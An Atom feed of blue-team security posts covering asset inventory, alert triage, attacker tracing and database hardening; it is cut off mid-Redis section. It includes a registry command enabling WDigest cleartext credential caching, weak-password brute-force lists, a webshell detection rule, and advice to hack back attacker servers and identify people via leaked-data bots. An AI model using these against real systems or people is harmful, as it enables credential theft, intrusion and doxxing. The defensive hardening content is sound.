<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wintrysec</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://wintrysec.github.io/"/>
  <updated>2020-08-21T08:11:08.688Z</updated>
  <id>https://wintrysec.github.io/</id>
  
  <author>
    <name>wintrysec</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【蓝队】资产梳理</title>
    <link href="https://wintrysec.github.io/2020/08/21/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%907%20%E8%93%9D%E9%98%9F%E3%80%91%E8%B5%84%E4%BA%A7%E6%A2%B3%E7%90%86/%E3%80%90%E8%93%9D%E9%98%9F%E3%80%91%E8%B5%84%E4%BA%A7%E6%A2%B3%E7%90%86/"/>
    <id>https://wintrysec.github.io/2020/08/21/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%907%20%E8%93%9D%E9%98%9F%E3%80%91%E8%B5%84%E4%BA%A7%E6%A2%B3%E7%90%86/%E3%80%90%E8%93%9D%E9%98%9F%E3%80%91%E8%B5%84%E4%BA%A7%E6%A2%B3%E7%90%86/</id>
    <published>2020-08-21T06:52:40.106Z</published>
    <updated>2020-08-21T08:11:08.688Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>作为一名优秀的防守方首先要知道己方都有什么资产；</p><p>就像一个保镖知道自己要去保护的对象，否则目标搞错了做多少工作都是白费；</p><p>有些企业会有资产治理类的设备，这种情况直接导出就行了，如果没有的话还需要我们手工梳理资产。</p></blockquote><h1 id="外网资产梳理"><a href="#外网资产梳理" class="headerlink" title="外网资产梳理"></a>外网资产梳理</h1><blockquote><p>1、确认防守单位的一级域名（问客户要、或 天眼查）</p><p>2、枚举子域名（OneForAll收集子域名）</p><p>3、网站所在C段端口扫描（可用Goby或自己开发）【系统服务识别、HTTP服务title识别，HTTP服务页面截图】</p></blockquote><h1 id="内网资产梳理"><a href="#内网资产梳理" class="headerlink" title="内网资产梳理"></a>内网资产梳理</h1><blockquote><p>从客户那里问到内网IP段，并且获得内网准入权限后就是空间探测那一套了;</p><p>空间探测核心功能说白了就是端口扫描，探测哪些IP是存活的开放了哪些服务，如开了HTTP访问一下获取个title；</p><p>再多点做下Web指纹识别，扫下目录，http服务页面自动截图等，还有加漏扫的。</p></blockquote><p><strong>最终形成一个类似如下信息的表格：</strong></p><table><thead><tr><th>业务系统名称</th><th>URL</th><th>系统所在取域</th><th>中间件</th><th>公网IP</th><th>内网IP</th></tr></thead><tbody><tr><td>百度搜索</td><td><a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a></td><td>外网</td><td>BWS/1.0</td><td>233.233.233.233</td><td>10.10.10.123</td></tr><tr><td>莆田系医院官网</td><td><a href="http://192.168.1.110:8886" target="_blank" rel="noopener">http://192.168.1.110:8886</a></td><td>内网</td><td>Tomcat</td><td></td><td>192.168.1.110</td></tr></tbody></table><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>很多地方并不能直接登录客户的服务器，所以下一篇的<strong><code>基线加固</code></strong>我们做不了；</p><p>我们只能从黑盒的角度做下渗透测试，尽可能多的发现高危漏洞进行整改；</p><p>这个步骤相信各位师傅都很清楚了，我简单写下我自己的思路</p><p><strong>1、弱口令排查</strong></p><blockquote><p>系统服务弱口令（SSH、MySQL、FTP、SMB、RDP）</p><p>Web后台弱口令</p><p>​    admin 爆破弱口令（123456、111111、admin、admin123、admin888）</p><p>​    OA弱口令爆破用户名（用户名top500）</p><p>​    有验证码简单尝试、无验证码超大字典批量爆破</p></blockquote><p><strong>2、未授权访问</strong></p><blockquote><p>redis 未授权</p><p>MongoDB 未授权</p><p>Memcached 未授权</p><p>ZooKeeper 未授权</p><p>Hadoop 未授权</p><p>Jenkins 未授权</p><p>Rsync 未授权</p></blockquote><p><strong>3、<code>中间件</code>&amp;<code>CMS框架</code>&amp;<code>OA</code>&amp;<code>安全设备</code>命令执行漏洞</strong></p><blockquote><p>WebLogic</p><p>Structs 2</p><p>Shiro</p><p>ThinkPHP</p><p>通达OA</p><p>深信服edr</p><p>等等这类漏洞，把自己漏洞库中有的都上一遍</p></blockquote><p><strong>4、Web漏洞扫描</strong></p><blockquote><p>弱口令进了后台找文件上传漏洞</p><p>用AWVS+xray等Web漏扫，扫描sqli、xss、信息泄露等Web安全漏洞</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;作为一名优秀的防守方首先要知道己方都有什么资产；&lt;/p&gt;
&lt;p&gt;就像一个保镖知道自己要去保护的对象，否则目标搞错了做多少工作都是白费；&lt;/p&gt;
&lt;p&gt;有些企业会有资产治理类的设备，这种情况直接导出就行了，如果没有的话还需要我们手工梳理资产。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="【3】红蓝对抗" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
      <category term="【7 蓝队】资产梳理" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%907-%E8%93%9D%E9%98%9F%E3%80%91%E8%B5%84%E4%BA%A7%E6%A2%B3%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>【蓝队】设备监控--研判</title>
    <link href="https://wintrysec.github.io/2020/08/21/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E8%AE%BE%E5%A4%87%E7%9B%91%E6%8E%A7%E7%A0%94%E5%88%A4/%E3%80%90%E8%93%9D%E9%98%9F%E3%80%91%E8%AE%BE%E5%A4%87%E7%9B%91%E6%8E%A7%E7%A0%94%E5%88%A4/"/>
    <id>https://wintrysec.github.io/2020/08/21/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E8%AE%BE%E5%A4%87%E7%9B%91%E6%8E%A7%E7%A0%94%E5%88%A4/%E3%80%90%E8%93%9D%E9%98%9F%E3%80%91%E8%AE%BE%E5%A4%87%E7%9B%91%E6%8E%A7%E7%A0%94%E5%88%A4/</id>
    <published>2020-08-21T06:52:40.106Z</published>
    <updated>2020-08-21T08:42:03.988Z</updated>
    
    <content type="html"><![CDATA[<h1 id="监控哪些设备？"><a href="#监控哪些设备？" class="headerlink" title="监控哪些设备？"></a>监控哪些设备？</h1><p>攻击开始之后蓝队应将精力放到流量监控类设备上（<code>WAF</code>、<code>IPS</code>、<code>态势感知</code>、<code>攻击阻断</code>等）</p><h2 id="过滤流量"><a href="#过滤流量" class="headerlink" title="过滤流量"></a>过滤流量</h2><p>从大量垃圾流量中寻找攻击信息是很耗费精力的，所以我们要先过滤掉一波。</p><blockquote><p>1、搞清楚客户内部网络部署的扫描器设备，将其过滤加白（或列个表格记录一下）</p><p>2、对告警类型进行筛选，像挖矿、蠕虫、拒绝服务这类不可能为攻击方发起的攻击的事件，直接过滤掉，减少告警数量</p></blockquote><h2 id="封哪些IP"><a href="#封哪些IP" class="headerlink" title="封哪些IP"></a>封哪些IP</h2><p><strong>注意：指挥部禁止直接封C段</strong></p><blockquote><p>1、封国外IP、代理IP、黑IP</p><p>2、短时间内发送大量请求的<code>IP</code>（攻击者从外网入口大多依赖扫描探测）</p><p>3、不认识的IP一律封，对方的跳板机服务器，往死里搞</p><p>4、除了可以100%判断为业务行为的告警，其他外网ip提交的处置建议一律为封禁</p></blockquote><p><strong>威胁情报查询</strong></p><p>微步在线： <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> </p><p>奇安信威胁情报中心：<a href="https://ti.qianxin.com/" target="_blank" rel="noopener">https://ti.qianxin.com/</a></p><p>IPIP（查IP所在地）：<a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">https://www.ipip.net/ip.html</a></p><h1 id="攻击行为上报"><a href="#攻击行为上报" class="headerlink" title="攻击行为上报"></a>攻击行为上报</h1><h2 id="攻击行为分析"><a href="#攻击行为分析" class="headerlink" title="攻击行为分析"></a>攻击行为分析</h2><blockquote><p>1、当出现告警时，首先判断攻击是否为真实攻击（即是否存在攻击payload）</p><p>2、对攻击payload进行复现，确认情况（若payload成功，则去应急响应处置） ，危害巨大的需先经客户同意</p></blockquote><h2 id="哪些可以上报"><a href="#哪些可以上报" class="headerlink" title="哪些可以上报"></a>哪些可以上报</h2><p><strong>发现类</strong></p><blockquote><p> 1、针对单个IP的攻击行为，不管是否利用成功，直接上报 </p><p> 2、批量扫描Ｃ段的攻击，直接上报</p></blockquote><p><strong>应急响应类</strong></p><blockquote><p>1、发现<code>Webshell</code>后，清除<code>Webshell</code></p><p>2、发现攻击者进入内网，及时修改系统账户，把攻击者踢出系统</p></blockquote><p><strong>追踪溯源类</strong></p><blockquote><p>完整还原攻击链，溯源到攻击队员的虚拟身份（网络ID）和真实身份，甚至反控队方主机</p><p>例如 <code>通过WebShell</code>  -&gt;  得到攻<code>击者的VPS</code> -&gt;  然后通过<code>VPS注册信息</code>得到攻击者的真实身份 -&gt; <code>攻击VPS反控对方</code> </p><p>威胁情报溯源等</p></blockquote><h2 id="上报要求"><a href="#上报要求" class="headerlink" title="上报要求"></a>上报要求</h2><p>上报事件时，提供完整的截图（ 包括源ip、目的ip，请求包请求体，响应包响应体等重要信息 ）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;监控哪些设备？&quot;&gt;&lt;a href=&quot;#监控哪些设备？&quot; class=&quot;headerlink&quot; title=&quot;监控哪些设备？&quot;&gt;&lt;/a&gt;监控哪些设备？&lt;/h1&gt;&lt;p&gt;攻击开始之后蓝队应将精力放到流量监控类设备上（&lt;code&gt;WAF&lt;/code&gt;、&lt;code&gt;IPS&lt;
      
    
    </summary>
    
    
      <category term="【3】红蓝对抗" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
      <category term="【9 蓝队】设备监控研判" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%909-%E8%93%9D%E9%98%9F%E3%80%91%E8%AE%BE%E5%A4%87%E7%9B%91%E6%8E%A7%E7%A0%94%E5%88%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>【蓝队】溯源反制</title>
    <link href="https://wintrysec.github.io/2020/08/21/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%90%E5%8D%81%E4%B8%80%E3%80%81%E8%93%9D%E9%98%9F%E3%80%91%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/%E3%80%90%E8%93%9D%E9%98%9F%E3%80%91%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/"/>
    <id>https://wintrysec.github.io/2020/08/21/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%90%E5%8D%81%E4%B8%80%E3%80%81%E8%93%9D%E9%98%9F%E3%80%91%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/%E3%80%90%E8%93%9D%E9%98%9F%E3%80%91%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/</id>
    <published>2020-08-21T06:52:40.106Z</published>
    <updated>2020-08-21T09:21:23.131Z</updated>
    
    <content type="html"><![CDATA[<h1 id="提高攻击成本，减少攻击意愿"><a href="#提高攻击成本，减少攻击意愿" class="headerlink" title="提高攻击成本，减少攻击意愿"></a>提高攻击成本，减少攻击意愿</h1><h2 id="部署蜜罐"><a href="#部署蜜罐" class="headerlink" title="部署蜜罐"></a>部署蜜罐</h2><p>如果客户购买了带有攻击者画像功能的现在蜜罐设备，那就爽歪歪了，等着上钩就行；</p><p>如果没有的话，可以自己学习一下蜜罐的知识，下边是推荐资源</p><p><a href="https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md" target="_blank" rel="noopener">最优秀的蜜罐列表</a></p><p><a href="https://ipot.sec-wiki.com/" target="_blank" rel="noopener">蜜罐技术研究小组</a></p><h2 id="废掉攻击者的手段"><a href="#废掉攻击者的手段" class="headerlink" title="废掉攻击者的手段"></a>废掉攻击者的手段</h2><p><strong>本地密码抓取的防御方法</strong></p><blockquote><p>1、2012 R2之后的版本，把用户放入 -&gt;  “受保护的用户” 的用户组，就不能抓取明文密码和散列值了。</p><p>2、安装<code>KB2871997</code>，并禁用<code>Administrator</code>账号（SID为500的账户，防止哈希传递攻击）</p></blockquote><p>Windows Server 2012 之后的版本默认关闭<code>Wdigest</code>，无法从内存中获取明文密码。</p><p>2012之前的版本安装了<code>KB2871997</code>，同样无法获取明文密码。</p><p><strong>开启和关闭<code>Wdigest</code>的命令</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启，值为1</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭，值为0</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p><strong>Webshell管理工具（冰蝎、蚁剑、哥斯拉等）</strong></p><p>分析工具的流量特征，在WAF等防护设备上添加自定义规则</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(uri_path * rco \.(jsp|jspx|php)$)&amp;&amp;(method * belong POST)&amp;&amp;(request_body * req ^[\w+/]&#123;1000,&#125;=?=?$)</span><br></pre></td></tr></table></figure><p><strong>防御mimikatz攻击</strong></p><p><code>mimikatz</code>在抓取明文密码或散列值时，需要Debug权限。</p><p>因为<code>mimikatz</code>需要和<code>lsass</code>进程进行交互，没有<code>Debug</code>权限的话<code>mimikatz</code>将不能读取<code>lsass</code>进程。</p><p>因此，将拥有Debug权限的本地管理员从<code>Administrators</code>组中删除即可。</p><p><strong>其它内网渗透工具</strong></p><blockquote><p>CobaltStrike、Metasploit等c2工具</p><p>frp、nps、reGeorg、ew、Termite、lcx等通道构建工具</p><p>impacket工具包</p><p><strong>具体做法：</strong>分析工具流量特征，在WAF等防护设备上自定义相关规则</p><p><strong>可参考：</strong> <a href="https://xz.aliyun.com/t/7606" target="_blank" rel="noopener">加密Webshell“冰蝎” 流量 100%识别</a> </p></blockquote><h1 id="溯源攻击者"><a href="#溯源攻击者" class="headerlink" title="溯源攻击者"></a>溯源攻击者</h1><blockquote><p>1、通过威胁情报分析，溯源IP    （微步、QAX威胁情报中心等）</p><p>2、反向渗透攻击者VPS</p><p>3、社工攻击者虚拟身份、真实身份（通过攻击者的常用shell特征、VPS地址信息、常用ID等入手）</p><p>如果能确认攻击者的邮箱或QQ等信息，社工库机器人走一波就差不多了</p></blockquote><p>详细过程建议参考以下文章：</p><p><a href="https://paper.seebug.org/945/#357-philipbeekoohk" target="_blank" rel="noopener">如何通过一封恶意邮件追踪幕后黑客组织</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;提高攻击成本，减少攻击意愿&quot;&gt;&lt;a href=&quot;#提高攻击成本，减少攻击意愿&quot; class=&quot;headerlink&quot; title=&quot;提高攻击成本，减少攻击意愿&quot;&gt;&lt;/a&gt;提高攻击成本，减少攻击意愿&lt;/h1&gt;&lt;h2 id=&quot;部署蜜罐&quot;&gt;&lt;a href=&quot;#部署蜜罐&quot;
      
    
    </summary>
    
    
      <category term="【3】红蓝对抗" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
      <category term="【十一、蓝队】溯源反制" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%90%E5%8D%81%E4%B8%80%E3%80%81%E8%93%9D%E9%98%9F%E3%80%91%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>【数据库】数据库安全加固</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8A%A0%E5%9B%BA/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8A%A0%E5%9B%BA/</id>
    <published>2020-08-12T15:00:01.000Z</published>
    <updated>2020-08-12T09:54:34.500Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Memcached服务加固方案"><a href="#Memcached服务加固方案" class="headerlink" title="Memcached服务加固方案"></a>Memcached服务加固方案</h1><blockquote><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，</p><p>所以对公网开放的Memcached服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。 </p></blockquote><h4 id="定期升级，使用官方最新版本Memcached"><a href="#定期升级，使用官方最新版本Memcached" class="headerlink" title="定期升级，使用官方最新版本Memcached"></a>定期升级，使用<a href="https://memcached.org/downloads" target="_blank" rel="noopener">官方最新版本Memcached</a></h4><h4 id="配置访问控制"><a href="#配置访问控制" class="headerlink" title="配置访问控制"></a>配置访问控制</h4><p>建议用户不要将服务发布到互联网上而被黑客利用，可以通过iptables配置访问控制规则。<br>例如，在Linux环境中运行命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -s 192.168.0.2 —dport 11211 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#在iptables中添加此规则只允许192.168.0.2这个IP对11211端口进行访问。</span></span><br></pre></td></tr></table></figure><h4 id="绑定监听IP"><a href="#绑定监听IP" class="headerlink" title="绑定监听IP"></a>绑定监听IP</h4><p>如果Memcached没有在公网开放的必要，可在Memcached启动时指定绑定的IP地址为 127.0.0.1。</p><p>例如，在Linux环境中运行以下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</span><br></pre></td></tr></table></figure><h4 id="使用最小化权限账号运行Memcached服务"><a href="#使用最小化权限账号运行Memcached服务" class="headerlink" title="使用最小化权限账号运行Memcached服务"></a>使用最小化权限账号运行Memcached服务</h4><p>使用普通权限账号运行，指定Memcached用户。</p><p>例如，在Linux环境中运行以下命令来运行Memcached：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</span><br></pre></td></tr></table></figure><h4 id="启用认证功能"><a href="#启用认证功能" class="headerlink" title="启用认证功能"></a>启用认证功能</h4><p>Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。<a href="http://www.postfix.org/SASL_README.html#saslauthd" target="_blank" rel="noopener">SASL认证详细配置手册</a></p><h4 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h4><p>修改默认11211监听端口为11222端口。</p><p>在Linux环境中运行以下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid</span><br></pre></td></tr></table></figure><p><strong>Memcached命令参数说明</strong></p><ul><li>-d 是指启动一个守护进程。</li><li>-m 是指分配给Memcached使用的内存数量，单位是MB，以上为1024MB。</li><li>-u 是指运行Memcached的用户，推荐使用单独普通权限用户Memcached，而不要使用root权限账户。</li><li>-l 是指监听的服务器IP地址，例如指定服务器的IP地址为127.0.0.1。</li><li>-p 是用来设置Memcached的监听端口，默认端口为11211。建议设置1024以上的端口。</li><li>-c 是指最大运行的并发连接数，默认是1024。可按照您服务器的负载量来设定。</li><li>-P 是指设置保存Memcached的pid文件，例如保存在 /tmp/memcached.pid 位置。</li></ul><h4 id="备份数据"><a href="#备份数据" class="headerlink" title="备份数据"></a>备份数据</h4><p>为避免数丢失，升级前请做好备份。</p><h1 id="MySQL安全加固"><a href="#MySQL安全加固" class="headerlink" title="MySQL安全加固"></a>MySQL安全加固</h1><h4 id="帐号安全"><a href="#帐号安全" class="headerlink" title="帐号安全"></a>帐号安全</h4><ul><li><p><strong>禁止 Mysql 以管理员帐号权限运行</strong></p><p>以普通帐户安全运行 mysqld，禁止以管理员帐号权限运行 MySQL 服务。在 /etc/my.cnf 配置文件中进行以下设置。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysql.server]</span><br><span class="line"> user&#x3D;mysql</span><br></pre></td></tr></table></figure></li><li><p><strong>避免不同用户间共享帐号</strong></p><p>参考以下步骤。</p><ol><li><p>创建用户。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; </span><br><span class="line">mysql&gt; insert into mysql.user(Host,User,Password,ssl_cipher,x509_issuer,x509_subject) values(&quot;localhost&quot;,&quot;phplamp&quot;,password(&quot;passwd&quot;),&#39;&#39;,&#39;&#39;,&#39;&#39;);</span><br></pre></td></tr></table></figure><p>执行以上命令可以创建一个 phplamp 用户。</p></li><li><p>使用该用户登录 MySQL 服务。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uphplamp -ppasswd</span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>删除无关帐号</strong></p><p>DROP USER 语句可用于删除一个或多个 MySQL 账户。使用 DROP USER 命令时，必须确保当前账号拥有 MySQL 数据库的全局 CREATE USER 权限或 DELETE 权限。</p><p>账户名称的用户和主机部分分别与用户表记录的 User 和 Host 列值相对应。</p><p>执行<code>DROP USER user;</code>语句，您可以取消一个账户和其权限，并删除来自所有授权表的帐户权限记录。</p></li></ul><h4 id="口令"><a href="#口令" class="headerlink" title="口令"></a>口令</h4><p>检查账户默认密码和弱密码。口令长度需要至少八位，并包括大小写字母、数字和特殊符号字符串(两个以上)，且五次以内不得设置相同的口令。</p><p>密码应至少每 90 天进行一次更换。</p><p>您可以通过执行以下命令修改密码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update user set password&#x3D;password(&#39;test!p3&#39;) where user&#x3D;&#39;root&#39;; mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure><h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><p>在数据库权限配置能力范围内，根据用户的业务需要，配置其所需的最小权限。</p><ol><li><p>查看数据库授权情况。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; select * from user;</span><br><span class="line">mysql&gt;select * from db;</span><br><span class="line">mysql&gt;select * from host;</span><br><span class="line">mysql&gt;select * from tables_priv;</span><br><span class="line">mysql&gt;select * from columns_priv;</span><br></pre></td></tr></table></figure></li><li><p>通过 revoke 命令回收不必要的或危险的授权。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; help revoke</span><br><span class="line">Name: &#39;REVOKE&#39;</span><br><span class="line">Description:</span><br><span class="line">Syntax:</span><br><span class="line">REVOKE</span><br><span class="line">priv_type [(column_list)]</span><br><span class="line">   [, priv_type [(column_list)]] ...</span><br><span class="line"> ON [object_type]</span><br><span class="line">     &#123;</span><br><span class="line">         *</span><br><span class="line">       | *.*</span><br><span class="line">       | db_name.*</span><br><span class="line">       | db_name.tbl_name</span><br><span class="line">       | tbl_name</span><br><span class="line">       | db_name.routine_name</span><br><span class="line">     &#125;</span><br><span class="line"> FROM user [, user] ...</span><br></pre></td></tr></table></figure></li></ol><h4 id="开启日志审计功能"><a href="#开启日志审计功能" class="headerlink" title="开启日志审计功能"></a>开启日志审计功能</h4><p>数据库应配置日志功能，便于记录运行状况和操作行为。</p><p>MySQL服务有以下几种日志类型：</p><ul><li><p><strong>错误日志</strong>： -log-err</p></li><li><p><strong>查询日志</strong>： -log （可选）</p></li><li><p><strong>慢查询日志</strong>： -log-slow-queries （可选）</p></li><li><p><strong>更新日志</strong>： -log-update</p></li><li><p><strong>二进制日志</strong>： -log-bin</p><p>找到 MySQL 的安装目录，在 my.ini 配置文件中增加上述所需的日志类型参数，保存配置文件后，重启 MySQL 服务即可启用日志功能。</p><p><strong>例如：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Enter a name for the binary log. Otherwise a default name will be used. </span></span><br><span class="line"><span class="comment">#log-bin= </span></span><br><span class="line"><span class="comment">#Enter a name for the query log file. Otherwise a default name will be used. </span></span><br><span class="line"><span class="comment">#log= </span></span><br><span class="line"><span class="comment">#Enter a name for the error log file. Otherwise a default name will be used. </span></span><br><span class="line"><span class="built_in">log</span>-error= </span><br><span class="line"><span class="comment">#Enter a name for the update log file. Otherwise a default name will be used. </span></span><br><span class="line"><span class="comment">#log-update=</span></span><br></pre></td></tr></table></figure><p>该参数中启用错误日志。如果您需要启用其他的日志，只需把对应参数前面的 “#” 删除即可。</p><p><strong>日志查询操作说明</strong></p><ul><li>执行<code>show variables like &#39;log_%&#39;;</code>命令可查看所有的 log。</li><li>执行<code>show variables like &#39;log_bin&#39;;</code>命令可查看具体的 log。</li></ul></li></ul><h4 id="安装最新补丁"><a href="#安装最新补丁" class="headerlink" title="安装最新补丁"></a>安装最新补丁</h4><p>确保系统安装了最新的安全补丁。</p><p><strong>注意</strong>： 在保证业务及网络安全的前提下，并经过兼容性测试后，安装更新补丁。</p><h4 id="如果不需要，应禁止远程访问"><a href="#如果不需要，应禁止远程访问" class="headerlink" title="如果不需要，应禁止远程访问"></a>如果不需要，应禁止远程访问</h4><p>禁止网络连接，防止猜解密码攻击、溢出攻击、和嗅探攻击。</p><p><strong>注意</strong>： </p><p>仅限于应用和数据库在同一台主机的情况。</p><p>如果数据库不需要远程访问，可以禁止远程 TCP/IP 连接，</p><p>通过在 MySQL 服务器的启动参数中添加<code>--skip-networking</code>参数使 MySQL 服务不监听任何 TCP/IP 连接，增加安全性。</p><p>您可以使用防火墙进行内外网访问控制，建议不要将数据库高危服务对互联网开放。</p><h4 id="设置可信-IP-访问控制"><a href="#设置可信-IP-访问控制" class="headerlink" title="设置可信 IP 访问控制"></a>设置可信 IP 访问控制</h4><p>通过数据库所在操作系统的防火墙限制，实现只有信任的 IP 才能通过监听器访问数据库。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON db.* ·-&gt; -&gt; TO 用户名@&#39;IP子网&#x2F;掩码&#39;;</span><br><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON db.*-&gt; -&gt; TO 用户名@&#39;IP子网&#x2F;掩码&#39;;</span><br></pre></td></tr></table></figure><h4 id="连接数设置"><a href="#连接数设置" class="headerlink" title="连接数设置"></a>连接数设置</h4><p>根据您的机器性能和业务需求，设置最大、最小连接数。</p><p>在 MySQL 配置文件（my.conf 或 my.ini）的 [mysqld] 配置段中添加<code>max_connections = 1000</code>，保存配置文件，重启 MySQL 服务后即可生效。</p><h1 id="Redis安全加固"><a href="#Redis安全加固" class="headerlink" title="Redis安全加固"></a>Redis安全加固</h1><blockquote><p>Redis 因配置不当存在未授权访问漏洞，可以被攻击者恶意利用。</p><p>在特定条件下，如果 Redis 以 root 身份运行，黑客可以给 root 账号写入 SSH 公钥文件，</p><p>直接通过 SSH 登录受害服务器，从而获取服务器权限和数据。</p><p>一旦入侵成功，攻击者可直接添加账号用于 SSH 远程登录控制服务器，</p><p>给用户的 Redis 运行环境以及 Linux 主机带来安全风险，如删除、泄露或加密重要数据，引发勒索事件等。</p></blockquote><h4 id="1-网络层加固"><a href="#1-网络层加固" class="headerlink" title="1.网络层加固"></a>1.网络层加固</h4><ul><li><p><strong>指定 Redis 服务使用的网卡</strong></p><p>默认情况下，Redis 监听 <code>127.0.0.1</code>。如果仅仅是本地通信，请确保监听在本地。</p><p>这种方式可以在一定程度上缓解 Redis 未授权访问的风险（例外情况下，如果 Redis 以 root 用户运行，攻击者借助已有的 webshell，就可以利用该 Redis 来反弹 shell 以实现提权）。</p><p>在 <code>redis.conf</code> 文件中找到 <code># bind 127.0.0.1</code>，将前面的 <code>#</code> 去掉，然后保存。</p><p><strong>注意</strong>：</p><ul><li><p>该操作需要重启 Redis 才能生效。</p></li><li><p>修改后只有本机才能访问 Redis，也可以指定访问源 IP 来访问 Redis。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind 192.168.1.100 10.0.0.1</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>2.设置防火墙策略</strong></p><p>如果正常业务中 Redis 服务需要被其他服务器来访问，可以通过 iptables 策略，仅允许指定的 IP 来访问 Redis 服务。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s x.x.x.x -p tcp --dport 6379 -j ACCEPT</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-账号与认证"><a href="#3-账号与认证" class="headerlink" title="3.账号与认证"></a>3.账号与认证</h4><ul><li><p><strong>设置访问密码</strong></p><p>在 <code>redis.conf</code> 中找到 <code>requirepass</code> 字段，去掉其注释，并在后面填上需要的密码。Redis 